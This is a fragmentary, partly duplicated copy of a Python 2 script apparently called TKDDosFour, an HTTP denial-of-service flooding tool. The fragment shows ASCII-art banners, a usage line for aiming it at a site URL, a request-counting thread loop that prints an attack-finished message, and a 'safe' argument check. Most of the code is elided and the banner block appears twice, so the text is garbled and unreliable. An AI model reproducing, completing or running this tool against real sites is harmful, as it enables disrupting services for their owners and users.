...
#
# CREATOR :  CyberTKR/ , version 1.0
# ----------------------------------------------------------------------------------------------
# TKDDosFour / edited version info:
#
# Version 0.9 BETA
# Any malicious usage of this tool is prohibited and illegal!            | @CyberTKR/TKDDos-Python
# ----------------------------------------------------------------------------------------------
...
\$$$$$$  \$$$$$$$ $$$$$$$  \$$$$$$$\$$ |               $$ |  $$ | \$$\ 
 \______/ \____$$ \_______/ \_______\__|               \__|  \__|  \__|
         ...
         \$$$$$$  |                                                    
          \______/ 
    ================================================
    Usage: python TKDDosFour.py http://www.siteurl.com/
    ================================================
"""
	...
	def run(self):
		...
		while flag==0:
			if (previous+1<request_counter) & (previous<>request_counter):
				...
				previous=request_counter
		if flag==2:
			print "--> TKDDos@Four Attack Finished <--"
...
\$$$$$$  \$$$$$$$ $$$$$$$  \$$$$$$$\$$ |               $$ |  $$ | \$$\ 
 \______/ \____$$ \_______/ \_______\__|               \__|  \__|  \__|
         ...
         \$$$$$$  |                                                    
          \______/ 
    ================================================
    Usage: python TKDDosFour.py http://www.example.com/
    ================================================
"""
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
